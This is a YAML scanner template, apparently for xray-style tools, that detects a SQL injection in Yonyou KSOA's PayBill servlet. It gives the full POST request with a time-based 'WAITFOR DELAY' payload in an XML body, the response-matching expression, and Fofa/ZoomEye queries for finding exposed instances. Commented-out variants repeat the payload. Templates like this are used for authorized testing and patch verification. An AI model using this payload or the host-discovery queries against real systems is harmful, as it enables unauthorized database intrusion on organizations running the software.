id: yonyou-ksoa-paybill-sqi

info:
  name: 用友时空 KSOA PayBill SQL 注入漏洞
  author: Observer
  severity: high
  verified: true
  description: |-
    Fofa: app="用友-时空KSOA"
    ZoomEye: app:"用友时空KSOA"
  tags: yonyou,ksoa,sqli
  created: 2023/12/06

set:
  randstr: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /servlet/PayBill?caculate&_rnd=
      body: |
        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY'00:00:10';-</name><name>1</name><name>{{randstr}}</name></root>
    expression: response.status == 200 && response.body.bcontains(bytes(randstr)) #&& response.latency <= 11000 &&  response.latency >= 10000
  # r1:
  #   request:
  #     method: POST
  #     path: /servlet/PayBill?caculate&_rnd=
  #     body: |
  #       <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY'00:00:06';-</name><name>1</name><name>{{randstr}}</name></root>
  #   expression: response.status == 200 && response.body.bcontains(bytes(randstr)) && response.latency <= 7000 &&  response.latency >= 6000
  # r2:
  #   request:
  #     method: POST
  #     path: /servlet/PayBill?caculate&_rnd=
  #     body: |
  #       <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY'00:00:10';-</name><name>1</name><name>{{randstr}}</name></root>
  #   expression: response.status == 200 && response.body.bcontains(bytes(randstr)) && response.latency <= 11000 &&  response.latency >= 10000
  # r3:
  #   request:
  #     method: POST
  #     path: /servlet/PayBill?caculate&_rnd=
  #     body: |
  #       <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY'00:00:06';-</name><name>1</name><name>{{randstr}}</name></root>
  #   expression: response.status == 200 && response.body.bcontains(bytes(randstr)) && response.latency <= 7000 &&  response.latency >= 6000
expression: r0() #&& r1() && r2() && r3()